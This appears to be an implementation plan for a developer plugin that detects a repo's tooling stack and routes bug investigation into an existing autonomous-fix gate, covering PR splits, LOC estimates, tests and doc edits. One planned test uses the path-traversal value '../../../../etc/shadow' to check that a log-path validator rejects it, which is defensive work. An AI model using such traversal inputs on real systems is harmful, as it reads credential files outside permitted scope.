# Impl plan — stack-adaptive bug loop MVP (`detect-stack` + generic `investigate-bug`)

**Status:** ❄️ FROZEN 2026-06-07 (user-approved; `impl-plan-review` PASS — 2 blockers fixed: LOC floors + the §H 3-site amendment, now closed in-repo) · **Slug:** `stack-adapters`
**Freeze:** Build per the layered stack — `api-surface-review` already discharged in `design.md §A` → **PR-A1 → PR-A2 → PR-B1 → PR-B2** (strict A→B per PRD §7; PR-A split taken). Version bump is `scripts/release.sh`'s job (feature work adds `## [Unreleased]` only). Scope changes from here require a delta amendment to this doc.
**Design:** `docs/stack-adapters/design.md` (FROZEN 2026-06-07, `design-review` PASS). **PRD:** `docs/stack-adapters/prd.md` (FROZEN 2026-06-07). Built in `skills/detect-stack/` + `skills/investigate-bug/` + `commands/detect-stack.md`.
**Format/depth exemplar:** `docs/autonomous-fix/impl-plan.md` (same author). **Review method:** `skills/impl-plan-review/SKILL.md` (5 passes + adversarial counter-pass + freeze gate).

This ships **two skills + one command + one in-repo TOML schema + a loader + the AC1 value-shape lint + 3 detectors + 2 per-axis adapters + a resolver + the P3→P4 handoff**, sitting in front of the **shipped** `autonomous-fix` gate without re-implementing any write rail. The plan is a **PR-sized stack in PRD §7 build order**, with the design's PR-A>400-LOC flag **resolved by splitting PR-A into A1+A2** (justification in §1) and the riskiest mechanics in PR-B (the two-binding resolver, the P3→P4 handoff, the S9 conformance proof) **front-loaded**.

### LOC-budget honesty (Pass-1, grounded — read first)

The author's own precedent proves the LOC method is unreliable on the dominant file: `skills/autonomous-fix/reference/conformance-lint.py` **shipped at 505 LOC** while `docs/autonomous-fix/impl-plan.md:72` estimated it at **~150** (a 3.4× under-miss on the structurally-analogous validator-bearing Python); `SKILL.md` was estimated ~370 (`impl-plan.md:35,51`) and shipped **234** (−37%). Therefore **every `~NNN LOC` header below is an estimate, not a contract** — re-measure at author time, treat the Python budgets as *floors*, and **two relief-valve splits are pre-committed (not contingent-flag-and-hope)** with an explicit trigger:
- **PR-A1 relief valve (pre-committed):** if `profile.py` exceeds **~300 hand-written non-test LOC** at author time, split the **7 field-kind validators into `skills/detect-stack/reference/shapes.py`** (the bulky, independently-reviewable part), leaving `profile.py` = dataclasses + loader + writer. Take this *before* opening the PR if the trigger fires.
- **PR-B1 relief valve (pre-committed):** if PR-B1's hand-written non-test source exceeds **~340 LOC**, split at the seam the plan itself names — **PR-B1a (contracts + resolver, the decision core + S5.2 exit gate) → PR-B1b (the two adapters, the I/O layer)**. The resolver depends on the contracts but *not* the adapters (design §A.0/§B.1), so this is a real architectural seam, and freezing the contract before the adapters strengthens the S9 conformance premise.

These are pre-decided so an overshoot is executed as planned, not improvised at freeze.

**What "tests" means here (PRD §3 verification predicate, mixed surface).** This MVP ships **real unit-testable Python** alongside the markdown skills. The test surface is three things, mirrored to PRD scenarios 1:1 (the PRD §3 once-defined predicate):
- **`[unit]`** — pytest assertions over fixture inputs only (a fixture repo tree / fixture `gh --json` / fixture log file / a fixture `apex.profile.toml` / a fixture environment manifest), incl. any assertion running only the routing **selector** over a fixture profile. Bulk of coverage (S1, S1.1, S1.2, S1.3, S2, S2.1, S3, S5.1, S5.2, S7, S8, S9, S10).
- **`[gate-walk]`** — an assertion over the *combined* `investigate-bug → autonomous-fix` **decision text** (the gate has no shipped runtime — the same convention `autonomous-fix`'s PRD uses). Reserved for the compose-flow scenarios (S4, S5-flow, S6).
- **`[doc-assert]`** — a **grep/read-assert over the SKILL.md prose** (NOT a pytest case) — the skill doc states the rule unambiguously (S3 doc-leg, S6 doc-leg, the Distinct-from boundaries).

No E2E (both skills are CLI/markdown surfaces, no UI — PRD §3 justifies). There are zero E2E-tagged scenarios in the PRD, so the spine-E2E obligation is vacuously satisfied (stated, not skipped).

**Where the lint lives (a deliberate divergence from the autonomous-fix precedent, flagged).** `autonomous-fix`'s `conformance-lint.py` validates the *reference template the skill ships* → it lives at `skills/autonomous-fix/reference/`. The AC1 value-shape lint validates a *user repo's `apex.profile.toml`* (a runtime artifact) and is *imported by the loader* (it shape-validates on read too — design §C.3). To keep the autonomous-fix `reference/` convention, the loader + lint + schema exemplar + fixtures live under **`skills/detect-stack/reference/`** (mirroring `skills/autonomous-fix/reference/`), with the *pytest* suites under a top-level `tests/`. A separate apex-CI workflow over the shipped fixture profile is the analog of the autonomous-fix CI gate — see L-D (deferred).

**Live-tree facts re-verified this session at HEAD (every citation true at HEAD):**
- **Plugin version is `0.3.7`** in `.claude-plugin/plugin.json:3` AND `.claude-plugin/marketplace.json:12`. This effort releases as **`0.3.8`** (point release; the 0.3.6/0.3.7 precedent shipped whole skills as patches). **The bump is `scripts/release.sh 0.3.8`'s job, NOT the feature PR.**
- **`CHANGELOG.md` head has NO `## [Unreleased]`** (head is `## [0.3.7] — 2026-06-07`; the 0.3.7 release consumed the prior Unreleased). This effort creates a fresh **`## [Unreleased]`** — `scripts/release.sh:59` HARD-REQUIRES it, `:67` aborts on a pre-bumped version, `:83` dates+renames it, `:79` bumps `marketplace.json` too.
- **Slash-menu count is `14`** at HEAD (14 `commands/*.md` files, verified). The canonical registry is **`MAINTAINING.md`'s "Known sites holding the count" table** (header `:43`, six rows, the `### Grep command` fenced recipe at `:58-61`). **Re-grep by FORM at build time with `--exclude-dir=.claude`, never by stored line number.** The six live "14" sites at HEAD: `README.md:59` (~14 things you drive — **NOTE 4a: this line ALSO carries a `30+` decoy; bump only the `~14`**), `README.md:222` (14-command cheat sheet), `README.md:233` (14 **entry-point**), `commands/help.md:10`, `commands/help.md:61`, `WALKTHROUGH.md:100`. PR-A2 bumps **14→15**.
- **Two stale worktrees exist** (`.claude/worktrees/wonderful-almeida-a10191/` AND `.claude/worktrees/stoic-pascal-9a2822/` — NOT one as design §G.1/§G.4 say). The bare recipe surfaces ~14 false count-hits across both; **`--exclude-dir=.claude` is load-bearing today and is mandatory at build-time grep.** The canonical `MAINTAINING.md:59-60` recipe still has only `--exclude-dir=node_modules` — PR-A2 adds `--exclude-dir=.claude` to it as a 1-line registry-improvement (PR #25 is merged; there is no PR #25 to coordinate into).
- **The README has BOTH tables (verified — corrects the prior draft's false claim):** `### Skills` at `:13`, `### Commands` at `:57` (table header at `:62`, **13 `/apex:` rows** `:63-76`), `### Hooks` at `:81`. The 13-row Commands table confirms the pre-existing `/apex:adversarial-pair` gap (14 commands, 13 rows — adversarial-pair absent). **Design §G.3 (`design.md:458-461`) makes the detect-stack Commands-table row a MANDATORY PR-A2 edit, not a hedged "if".**
- **The §H amendment is applied at ONLY 1 of the 3 design-mandated sites** (`design.md:476` names `prd.md:5`, `prd.md:154`, `SKILL.md:29`): `docs/autonomous-fix/prd.md:6` carries the AMENDMENT block ✓; **`docs/autonomous-fix/prd.md:146`** (the design's drifted `:154`) still reads the un-amended "investigate-bug (refactored to invoke this parent…)" ✗; **`skills/autonomous-fix/SKILL.md:29`** still reads "they will be refactored to invoke it. Parent/child, not a parallel path." ✗ (`grep interpose` → NONE). **PR-B2 MUST add the two missing one-liners** (a cited build step, §PR-B2 + §5) — they are a frozen-design mechanism, and the un-amended text actively contradicts `:6`.
- **`skills/autonomous-fix/reference/` exists** — `autonomous-fix.yml` (155 LOC) + `conformance-lint.py` (**505 LOC**) + `fixtures/` (7) — the precedent for "a skill that ships a reference artifact + lint + fixtures + a CI workflow."
- **`.github/workflows/conformance-lint.yml` exists** (apex's first CI workflow; `on: push` + `pull_request`, paths-scoped to `skills/autonomous-fix/reference/**`; `permissions: contents: read`). A stack-adapters CI gate would be a second workflow or a job added to it — see L-D.
- **The gate's seam lines** (verified, so the handoff cites real anchors): B2 test-file-only carve-out `skills/autonomous-fix/SKILL.md:35`; B1 wrapper `assert-red-test` + `sensitive-route-prewrite` `:36`; P2 invocation-#1 read-only `:57-63`; P3 reproduce-first `:65-71`; P4 staged-write `:73-79`; the single-block random-nonce fence incl. title `:176-191`; the ESCALATE hard leg `:96`.
- **FLOW.md:** "## Side paths (not phase-sequential)" `:254`; DEBUG `:256`; ADVERSARIAL PAIR `:258`; **AUTONOMOUS BUG-FIX prose `:260`**; the matrix footnote fence holds `apex:incident-retro` `:304` + **`apex:autonomous-fix` `:305`** (single-line-per-entry geometry). detect-stack is a *command* skill; investigate-bug is *by-name*.
- **commands/help.md:** "YOU TYPE THESE … (14 entry-point commands)" `:10`; `/apex:setup` `:24`; "I FIRE THESE AUTOMATICALLY" `:26`; Post-release block (`incident-retro` `:37`, `autonomous-fix` `:39`); footer count `:61`.
- **README.md Skills rows:** `incident-retro` `:52`, `autonomous-fix` `:53`.
- **Hooks at HEAD: NINE scripts** (`apex-primer`, `format-on-save`, `guard-dependency-bump`, `guard-destructive`, `guard-security-paths`, `scan-secrets-on-edit`, `suggest-review-on-stop`, `suggest-skill-on-edit`, `suggest-skill-on-prompt`) + `hooks.json`. **This effort adds NO hook** (both skills are by-name + command-invoked) → no HOOKS-box edit, no hook-registration layer to sequence. Existing PreToolUse hooks (`suggest-skill-on-edit`, `scan-secrets-on-edit`, `guard-*`) WILL fire on the diff during implementation — expected, not a conflict, not a layer.
- **PR #25 (`MAINTAINING.md` + `hooks/suggest-skill-on-edit.sh`) is MERGED** (registry live at HEAD; no open coordination PR).
- **`commands/recon.md` pattern:** a command stub pointing at a by-name skill — the `/apex:detect-stack` stub follows it (design §11 placement).

---

## §1 Layered stack (4 build PRs + a deferred CI sub-question, PRD §7 build order)

> **Dependency rationale.** `api-surface-review` is **already discharged** — design §A IS that pass (verdict §A.4; frozen U2 contract at §A's close). The stack opens at PR-A. PRD §7 mandates **A→B strict**. Within PR-A, the **profile schema + loader + value-shape lint** is the foundation every detector + every PR-B consumer depends on; the **3 detectors** are a separable layer on top. The design flags PR-A may exceed 400 LOC and asks for an A1/A2 split — **taken (split), justified in the PR-A header.**

> **Risk-first within the strict order.** PRD §7 fixes A→B strict. Within PR-B, the riskiest pieces — the **two-binding resolver** (MCP-only-impossible structural guarantee), the **P3→P4 handoff** (compose-not-duplicate), the **S9 stub-conformance test** — are sequenced so the resolver + contracts + adapters land in **PR-B1** with the resolver's S5.2 exit gate proven *before* the markdown skill flow + handoff + conformance in **PR-B2**. Each PR-B layer carries a circuit breaker back to `design.md §B`/`§E`.

### PR-A1 — `skills/detect-stack/reference/` (schema exemplar + loader + AC1 value-shape lint + writer invariants) + `skills/detect-stack/SKILL.md` (skeleton) · ~360 LOC (estimate; re-measure — the analogous conformance-lint.py shipped at 505 vs a ~150 plan estimate, so treat Python budgets as floors; PR-A1 relief valve pre-committed above) (foundation)

**The decidable-no-secrets foundation.** Everything routing-relevant depends on the frozen profile shape + its read/write contract. Ships the data layer + its mechanical guard, **no detectors yet** (PR-A2).

**Files:**
- **`skills/detect-stack/reference/profile-schema.toml`** (~30 LOC) — the commented schema exemplar (design §C.1 verbatim shape). MVP schema carries `[tracker]`/`[observability]`/`[vcs]`/`[reproduce]`; the `service`/`secret_ref` rows are present **as commented reserved slots only** (PR-C forward-compat, design §C.2 — MVP detect-stack writes neither).
- **`skills/detect-stack/reference/profile.py`** (~250 LOC estimate — FLOOR; if >~300 non-test LOC, peel the 7 validators into `shapes.py` per the pre-committed PR-A1 relief valve) — carrying:
  - The frozen dataclasses: `Profile`, `AxisConfig` (per-axis `kind`/`mcp`/`cli` + axis extras), `ProfileError(code: ProfileErrorCode, field: str | None)` with `code ∈ {MALFORMED, SHAPE_VIOLATION, MISSING_BINDING}` (design §C.3).
  - **`load_profile(path) -> Profile | ProfileError`** — the 4-step loader (design §C.3): `tomllib` parse → value-shape validate every field → AC2a field-presence check per routed axis → frozen `Profile`. **Shape-validates on read** (catches a hand-edited token at investigate time, §C.3, §I).
  - **The AC1 value-shape allowlist** (design §C.2 table), one validator per field-kind: `enum`, `mcp` (`mcp__*` prefix or empty), `cli` (`[a-z][a-z0-9_-]*` or empty — no separators/flags), `identifier` (`[A-Za-z0-9._/-]`, rejects token-shaped values), **`repo_path`** (the confinement rule: repo-relative, no absolute, no `..`, resolved realpath stays under repo root — the §C.2 operation field), `secret_ref` (env-var NAME `[A-Z][A-Z0-9_]*`, validated-if-present for PR-C forward-compat), `free`.
  - **`write_profile(profile, path)`** carrying the two pinned writer invariants — **AC7 un-inferable predicate** (un-inferable iff no probe produced a value → prompt/placeholder, never default — design §D.3) and **AC2b no-silent-drop** (record every binding a probe reports available; `cli=""` only when no probe found it — design §D.3) — plus the **atomic temp-file+rename write** (no partial profile on interrupt — design §I). In PR-A1 these are exercised by *fixture* probe-results (a dict), not live detectors.
- **`skills/detect-stack/SKILL.md`** (~110 LOC skeleton — estimate likely high; the densest shipped SKILL.md is `ai-pre-review-checklist` at ~355, and autonomous-fix's full gate is 234) — frontmatter (`name: detect-stack` + description keyword set: detect-stack, stack profile, apex.profile.toml, routing config, tracker/observability axis, two-binding, interactive/unattended), "What this is" (probe → auto-fill → prompt; writes routing-only TOML), the §C.1 schema block, the §C.2 value-shape table, the writer-invariant predicates (AC2b/AC7), **the Distinct-from boundaries** (vs `apex:recon`; vs `apex:setup`, design §D.4). The probe-set table (§D.1) + conflict rule (§D.2) land as **stubs with a pointer** filled by PR-A2 (the intra-PR forward-reference discipline the autonomous-fix plan used for L1/L1b). *Relief valve, flagged: if the body overshoots, the AC2b/AC7 prose moves to `reference/writer-contract.md` — a design-faithful split, flag at freeze.*

**PRD scenarios served + test artifact:**
- Test artifact: **`tests/test_profile.py`** (pytest over fixture profiles, good + deliberately-bad) + the negative-fixture set in `skills/detect-stack/reference/fixtures/`.
- **S1.1** [unit] — a fixture/written profile parses, expected `kind` per axis. *(Lineage: PR-A1 covers S1.1 over a fixture / `write_profile(fixture_probe_results)`-synthesized profile; the PRD's "the **written** profile parses" detector-leg is PR-A2's S1 happy-path, since PR-A1 has no detector to write one.)*
- **S1.2** [unit] — every field value matches its declared field-shape (the AC1 value-shape allowlist); a token-shaped identifier and a non-NAME `secret_ref` each FAIL. **The AC1 enforcement-surface unit.**
- **S1.3** [unit] — every routed axis (tracker, observability) carries both `mcp` and `cli` (empty allowed), never a missing field → AC2a, asserted by the loader's presence check.
- **S7-edge** [unit] — malformed/absent `apex.profile.toml` → `load_profile` returns `ProfileError(MALFORMED)` (the loader half of S7; the routing half is PR-B2).
- **repo_path confinement** [unit] — a `log_path` of `../../../../etc/shadow` and a tree-escaping symlink each FAIL `repo_path` validation (design §C.2 / §6 Tampering F1). *(Sub-assertion of S1.2; the highest-value security unit — design-justified, not gold-plating.)*

**Depends on:** nothing in-stack (foundation; `api-surface-review` discharged in design §A). **Unblocks:** PR-A2 (detectors call `write_profile` + the invariants), PR-B1 (every consumer imports `Profile`/`AxisConfig` + calls `load_profile`).

### PR-A2 — `skills/detect-stack/reference/detect.py` (3 detectors + writer driver + conflict rule) + `commands/detect-stack.md` + the 14→15 count bump + the mandatory README Commands-table row + SKILL.md probe/conflict sections · ~370 LOC (estimate; re-measure)

**The detection layer + the slash command + the doc sweep.** Three probes write inferable fields; un-inferable fields hit the PR-A1 writer invariants. Adds the 15th command. (Pass-1 note: this is a detection-logic layer *and* a mechanical multi-file docs sweep — defensible because the count-bump must be atomic with the command, but expect a multi-file diff, not a single-module one.)

**Files:**
- **`skills/detect-stack/reference/detect.py`** (~250 LOC) — the **3 MVP detectors** (design §D.1; the env-var-NAMES probe is **PR-C, NOT here** — F3):
  - **deps** — parse `package.json`/`pyproject.toml`/`requirements.txt`/`Gemfile` → tracker+obs *kind* evidence (`@datadog/*`→`datadog`, `sentry-sdk`→`sentry`). Malformed manifest → skip with a noted gap, never crash (S10 edge).
  - **CI configs** — `.github/workflows/*`/`.gitlab-ci.yml`/`.circleci/` → unattended-context evidence + conflicting-signal detection.
  - **connected MCP** — ToolSearch probe (`mcp__*__` prefixes callable this session) → the `mcp` binding per axis. **Interactive-only**; unattended re-detect preserves prior `mcp` (design §D.3 / U8).
  - `read_vcs` — `vcs` from `git remote get-url origin` (host+repo, always inferable, never prompted).
  - **The conflict rule** (design §D.2): two incompatible signals (github remote + `.gitlab-ci.yml`) → interactive prompt / unattended `# TODO: resolve (...)` placeholder, never silently pick.
  - The driver that calls PR-A1's `write_profile` honoring AC2b/AC7/atomic-write, **preserving human-edited un-re-detected fields on re-run** (drift, U3/U8).
- **`commands/detect-stack.md`** (~25 LOC) — the `/apex:detect-stack` command stub pointing at `skills/detect-stack/SKILL.md` (the `commands/recon.md` pattern). **The 15th command.**
- **Count-site bump 14→15 + the mandatory README Commands-table row** — atomically in this PR, per the `MAINTAINING.md` registry (re-grep by FORM with the recipe + **`--exclude-dir=.claude`** at build time, NOT by stored line number): `README.md` ×3 (`:59` ~14 things you drive → ~15 [**bump only the `~14`, NOT the co-located `30+`** — Note 4a]; `:222` 14-command cheat sheet → 15; `:233` 14 **entry-point** → 15), `commands/help.md` ×2 (`:10` header, `:61` footer), `WALKTHROUGH.md:100`. **Add `--exclude-dir=.claude` to the canonical `MAINTAINING.md:59-60` recipe** (1-line registry-improvement, co-located here — PR #25 is merged). **Add the `/apex:detect-stack` row to `commands/help.md`'s "YOU TYPE THESE" block after `/apex:setup` (`:24`).** **Add a `/apex:detect-stack | detect-stack | …` row to the README Commands table after the `/apex:setup` row (`README.md:76`, the table's last row) — MANDATORY per design §G.3 (the table is 13 rows for 14 commands today; after this it is 14 rows for 15 commands — the pre-existing `/apex:adversarial-pair` gap persists by exactly one, left as found, NOT this PR's to fix).** Add a `detect-stack` row to the README Skills table. **Leave untouched:** historical CHANGELOG "13/12" prose; the `~6` workflow narrative in `HOWTO.md`/`WALKTHROUGH.md:26`; `docs/incident-retro/design.md:8` "menu stays lean".
- **`skills/detect-stack/SKILL.md`** — fill the §D.1 probe-set and §D.2 conflict-rule stubs left by PR-A1.

**PRD scenarios served + test artifact:**
- Test artifact: **`tests/test_detect.py`** (pytest over a fixture repo tree + a fixture environment manifest) + fixture repo trees in `skills/detect-stack/reference/fixtures/repos/`. *(The S3 `[doc-assert]` leg is a separate grep/read-assert over `skills/detect-stack/SKILL.md`, NOT a pytest case in `test_detect.py`.)*
- **S1** [unit] — fixture repo (github.com remote, `package.json`, no obs config, `gh` on PATH) → writes `apex.profile.toml` with `[tracker] kind="github" cli="gh"`, `[observability] kind="console"`, `[vcs]`, `[reproduce]`, no field failing its shape. **This is S1.1's detector-written-profile-parses leg.** S1-edge (re-run updates in place, preserves human-edited un-re-detected fields — drift, U3/U8).
- **S2** [unit] — interactive session with `mcp__github__*` connected + `gh` on PATH → `[tracker]` records BOTH `mcp` and `cli`. S2-edge (MCP connected, CLI absent → `mcp` set, `cli=""`, note unattended→ask-user).
- **S2.1** [unit] — given a fixture environment manifest `{mcp__github__* available, gh available}`, both bindings recorded; a detector that drops either FAILS → **AC2b no-silent-drop**.
- **S3** [unit] + [doc-assert] — Datadog dep but no service name → prompts interactively (AC7); unattended re-detect writes `service = "" # TODO: fill`, never guesses. [doc-assert] (grep-assert over SKILL.md): the un-inferable→prompt/placeholder rule is stated. S3-edge (user skips → explicit placeholder; investigate-bug routes that axis to ask-user — verified cross-layer in PR-B2's S7).
- **S10** [unit] — github.com remote + `.gitlab-ci.yml` → records the conflict, prompts (interactive) / `# TODO: resolve (...)` placeholder (unattended), never silently picks. S10-edge (malformed `package.json` → deps probe skips with a noted gap, never crashes).

**Depends on:** PR-A1 (`write_profile` + invariants + shape lint). **Unblocks:** the end-to-end detect→investigate walk (PR-B2's gate-walks need a real producer). **Parallelism:** PR-A2 and PR-B1 both root only on PR-A1 and touch disjoint files (`detect.py` vs `contracts.py`/`adapters/`/`resolver.py`) — *but both import `profile.py`, so the parallelism is gated on PR-A1's schema being truly frozen* (the S9 conformance test is that freeze-check, and it doesn't run until PR-B2; if either branch needs a PR-A1 schema change the parallelism collapses into a foundation-module conflict — the contract-drift the freeze-section breaker names). **Deliberately kept serial** for review clarity (detect-stack provably complete before its consumer's gate-walk runs against a real producer).

> **PR-A split justification (the design's explicit ask, taken).** Combined, PR-A is ~700+ LOC (schema ~30 + loader/lint/writer ~250 + 3 detectors+driver ~250 + SKILL.md ~110 + command ~25 + count-bump + two fixture suites) — well over 400, and per the LOC-honesty note the Python halves are *floors*. The split is at a **real architectural seam**: PR-A1 is the **data layer + its decidable-no-secrets guard** (the durable contract every consumer depends on, incl. PR-B1); PR-A2 is the **detection layer + the slash-command wiring** (the count-bump + Commands-table row naturally co-located with the command that causes them). Each targets ≤400 LOC with pre-committed relief valves. Same "foundation-then-feature" cut as autonomous-fix L1/L2.

### PR-B1 — `skills/investigate-bug/reference/` core: the two per-axis contracts + the gh + grep adapters + the two-binding resolver · ~380 LOC (estimate; FLOOR — gh exit→5-error-code mapping + grep window-parse/confine/escape are dense; if >~340 non-test LOC take the pre-committed PR-B1a/B1b split)

**The read/diagnose/route core — the unit-testable heart, riskiest mechanic first.** Internal build order is risk-first: the resolver lands first with its S5.2 exit gate, then the contracts, then the adapters (the same order as the pre-committed PR-B1a/B1b seam, so the split is a no-cost cut if the trigger fires).

**Files:**
- **`skills/investigate-bug/reference/resolver.py`** (~80 LOC, **THE RISKIEST MECHANIC — built first**) — the two-binding `resolve(axis_cfg, mode) -> Binding` (design §B.1 verbatim): unattended→CLI-only (**never reads `axis_cfg.mcp`** — the structural MCP-only-impossible guarantee), interactive→MCP-first→CLI→ask-user. The two liveness probes `mcp_server_connected(prefix)` (ToolSearch "callable this session" bar) + `cli_on_path(cmd)` (`shutil.which`-shaped; does not execute). `AskUserBinding` is a real terminal (design §B.3). **Exit gate = S5.2 green:** `tracker.cli=""`+`tracker.mcp="mcp__github__*"`, resolved unattended, returns escalate AND the test asserts `axis_cfg.mcp` was never touched.
  - **CIRCUIT BREAKER:** if MCP-only-impossible cannot be expressed as a single code path with the `mcp`-field-never-read property (S5.2's single test), **STOP → `design.md §B`** — do not paper over with a runtime guard that "tries then rejects."
- **`skills/investigate-bug/reference/contracts.py`** (~70 LOC) — the frozen U2 contract (design §A.4): the two per-axis interfaces (tracker: `fetch_issue`+`comment`; observability: `query_logs(window, query?)`), the three normalized dataclasses (`NormalizedIssue`, `LogLine`, `CommitRef` — field-by-field per design §A.1/A.2/A.3), one `AdapterError(code, message)` with `code ∈ {NOT_FOUND, AUTH, RATE_LIMIT, UNAVAILABLE, MALFORMED}`. **No base class** (design §A.0).
- **`skills/investigate-bug/reference/adapters/gh_tracker.py`** (~90 LOC) — `fetch_issue(ref) -> NormalizedIssue` (wraps `gh issue view --json`, producer-side normalization), `comment(ref, body) -> None` (the contract verb called by neither investigate-bug nor the gate in the MVP — design §A.1). Maps `gh` exit/error → the 5 `AdapterError` codes.
- **`skills/investigate-bug/reference/adapters/grep_obs.py`** (~90 LOC) — `query_logs(window, query?) -> list[LogLine]` (greps the confined `log_path`, filters by parsed timestamp to the **required** window — the DoS bound, design §A.2; `query` is an **escaped literal** via `re.escape`, never a passthrough regex — the ReDoS close, design §E.1/§6 F2; multi-path grep sets `LogLine.source`). **Confines its read to the repo tree** (defense-in-depth, design §C.2/§6).
- **`recent_commits(paths, since)`** inline helper (design §A.3) — a plain `git log` read, NOT an adapter.

**PRD scenarios served + test artifact:**
- Test artifacts: **`tests/test_resolver.py`** + **`tests/test_adapters.py`** (pytest over fixture profiles / fixture `gh --json` / a fixture log file).
- **S5.1** [unit] — fixture profile `tracker.cli="gh"` → unattended selector returns the CLI binding, **never** the `mcp` field (AC3).
- **S5.2** [unit] — fixture profile `tracker.cli=""` (MCP-only) → unattended selector returns "no binding → escalate," **not** an MCP attempt (AC3 fail-path; asserts `axis_cfg.mcp` was never touched — the design §B.1 single-test guarantee). **The most load-bearing runtime test + PR-B1's resolver exit gate.** *(Lineage: S5.1/S5.2 are the `[unit]` half of the PRD's compound `S5 [gate-walk] + [unit]` tag — see PR-B2 for the `[gate-walk]` half.)*
- **S7** [unit] — profile `[tracker] kind="jira"` (no shipped adapter) → routes to ask-user hard fallback (interactive) / escalate (unattended); never a silent stub (AC4).
- **S8** [unit] — **the adapter-verb core.** Given fixture `gh issue view --json` output, `fetch_issue` returns the normalized issue (id, title, body, comments). Given a fixture log file + a time window, `query_logs(window)` returns exactly the in-window matching lines (the `ts` window-membership oracle).

**Depends on:** PR-A1 (imports `Profile`/`AxisConfig` from `profile.py`; develops against fixture profiles). **Unblocks:** PR-B2 (the handoff consumes the adapters' normalized output + the resolver's binding + the frozen contracts).

### PR-B2 — `skills/investigate-bug/SKILL.md` (the diagnosis flow + the P3→P4 handoff into the gate) + the S9 stub-conformance test + the §H two-site gate-doc carry-back · ~340 LOC (estimate; re-measure)

**The compose seam + the conformance proof + the dropped-mechanism fix (second-riskiest mechanic).** The markdown skill that wires the PR-B1 core into the `autonomous-fix` P3→P4 handoff, plus the S9 stub-conformance test, plus the two missing §H carry-back one-liners.

**Files:**
- **`skills/investigate-bug/SKILL.md`** (~260 LOC estimate; likely high — autonomous-fix's full gate SKILL.md is 234) — frontmatter (`name: investigate-bug`, by-name like `autonomous-fix`/`incident-retro` — **no command**; keyword set: investigate-bug, bug investigation, adapter routing, profile-driven, P3→P4 handoff, compose autonomous-fix, fenced bug-context bundle), the **diagnosis flow** (design §E.1 steps 1–7: `load_profile` → `resolve` per axis → `fetch_issue` → `derive_window`+`query_logs` → `recent_commits` → run the gate's P2/P3 → P3→P4 handoff), **the three diagnosis heuristics pinned to buildable MVP behavior** (design §E.1/N3 delegated these to impl-plan; pinned here so `test_handoff.py` tests a spec, not improvisation): **`derive_window`** = the failure span parsed from the issue body's newest timestamp ±30 min, defaulting to the last 1h if the body has no timestamp (NEVER the issue filing timestamp — design §A.1 deletion); **`ids_from`** = error-code / request-id regex matches over the body, each match `re.escape`-d before it becomes the grep `query` (the F2 escaped-literal rule); **`paths_guess`** = filenames appearing in `LogLine.text` stack frames, intersected with git-tracked files (worst case = a wrong-but-bounded `PLAN.json` the gate's Stage-A check still catches), the **untrusted-input handling** (issue body as untrusted data before the nonce fence — design §E.1/§6 F2), **the seam stated precisely** (design §E.2 — P3→P4, verified against `skills/autonomous-fix/SKILL.md:35,57-79,176-191`), **why compose-not-duplicate is structurally unbreakable** (design §E.3 — inherited from the gate's invocation-#1 allowlist), **the handoff bundle** (design §E.4 — red test + `PLAN.json` + nonce-fenced bundle incl. title), **the gate's four terminals, no fifth** (design §E.5), **the failure-routing table** (design §E.6), **the three Distinct-from boundaries** (vs `autonomous-fix`, vs BookBridge investigate-bug, vs `superpowers:systematic-debugging` — design §E.7), and a pointer to the §H amendment note.
  - **CIRCUIT BREAKER:** if the handoff cannot be expressed as a data-only edge into the gate's existing P4 (i.e. it needs a *new* write affordance, a fifth terminal, or to inspect the gate's deny-globs), **STOP → `design.md §E`** — the compose-erosion tell the PRD §6 Goodhart guard names.
- **The §H two-site gate-doc carry-back (cited build step — fixes the dropped frozen-design mechanism):** design §H (`design.md:476`) mandates the carry-back at THREE sites; only `docs/autonomous-fix/prd.md:6` is applied at HEAD. **This PR adds the two missing one-liners** so the gate docs stop contradicting the `:6` block:
  - **`docs/autonomous-fix/prd.md:146`** (the Downstream "investigate-bug (refactored to invoke this parent…)" line) — append a one-line note: *the investigation child now interposes the generic `apex:investigate-bug` (chain: BookBridge investigate-bug → generic apex:investigate-bug → autonomous-fix); the gate stays the direct parent of the fix path (`auto-fix-bug.yml`). See `docs/stack-adapters/`.*
  - **`skills/autonomous-fix/SKILL.md:29`** (the "they will be refactored to invoke it. Parent/child, not a parallel path." line) — append the same one-line interpose note.
  - The PR description ALSO references the already-applied `prd.md:6` block. *(NOTE: this means PR-B2's diff DOES touch two gate docs — corrected from the prior draft's false "no further gate-doc edit in this effort's diff"; the §5 revert line accounts for them.)*
- **`tests/test_conformance.py`** (~50 LOC) — **the S9 stub-conformance test.** A fixture stub adapter declaring the contract's verbs is dispatched to by investigate-bug's resolver/dispatch path with **zero diff to investigate-bug** — the first conformance test of the frozen U2 contract, asserted against the *frozen* contracts (PR-B1).
- **`tests/test_handoff.py`** — the gate-walk decision-text oracle over a fixture issue + fixture diff (S4/S5-flow/S6). *(The S6 `[doc-assert]` leg is a separate grep/read-assert over `skills/investigate-bug/SKILL.md`, NOT a pytest case in `test_handoff.py`.)*

**PRD scenarios served + test artifact:**
- Test artifacts: **`tests/test_conformance.py`** [unit] + **`tests/test_handoff.py`** [gate-walk] + the gate-walk worked-example table inside SKILL.md + `[doc-assert]` grep-asserts on the Distinct-from/four-terminals/§H note.
- **S9** [unit] — stub conformance: a third adapter drops in with zero `investigate-bug` diff (AC4 — the success-metric definition-of-done as a scenario).
- **S4** [gate-walk] — interactive run over a fixture GitHub issue with `mcp__github__*` available → MCP-fetch, grep the window, `git log` suspect commits, instantiate the gate's P2 (`PLAN.json` + red test under B2 carve-out) + P3 (`assert-red-test`), hand into P4. S4.1 (MCP binding chosen — interactive MCP-first), S4.2 (red on the unpatched tree before handoff), S4.3 (issue body inside the nonce fence + `PLAN.json` for Stage-A).
- **S5-flow** [gate-walk] — **the `[gate-walk]` half of the PRD's compound `S5 [gate-walk] + [unit]` tag** (its `[unit]` half = S5.1/S5.2 in PR-B1): same issue on the CI path, no session MCP → `gh` tracker + `grep` obs, no `mcp__*` attempt, hands into P4 identically. S5-edge (mcp-only tracker → unattended cannot route → gate ESCALATE).
- **S6** [gate-walk] + [doc-assert] — fix would touch `auth/` → investigate-bug hands off and STOPS; the sensitive-path refuse is the gate's (P4), producing ESCALATE. [doc-assert] (grep-assert over SKILL.md): investigate-bug does not inspect deny-globs / open a PR / carry cost logic (AC5/AC6); the combined terminal is one of the gate's four, no fifth. S6-edge (proposing to commit source directly → forbidden; only write is the reproducing test under B2).
- **S7-edge (cross-layer)** [gate-walk] — absent/malformed profile → prompt `/apex:detect-stack` (interactive) / HALT (unattended); verifies PR-A2's S3-skipped-placeholder cross-layer claim (an unresolved-placeholder axis routes to ask-user).

